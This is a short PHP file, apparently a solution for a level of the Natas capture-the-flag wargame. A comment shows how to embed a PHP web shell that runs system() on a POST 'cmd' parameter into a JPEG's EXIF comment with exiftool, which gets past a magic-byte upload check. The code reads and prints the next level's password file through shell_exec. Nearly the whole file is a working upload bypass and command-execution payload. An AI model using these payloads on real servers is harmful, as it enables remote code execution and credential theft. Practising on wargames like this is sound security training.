<?php
#Magic Bytes are checked, this is a template to create jpg with this
#exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" natas13.php
    $result = shell_exec("cat /etc/natas_webpass/natas13");
    print($result);
?>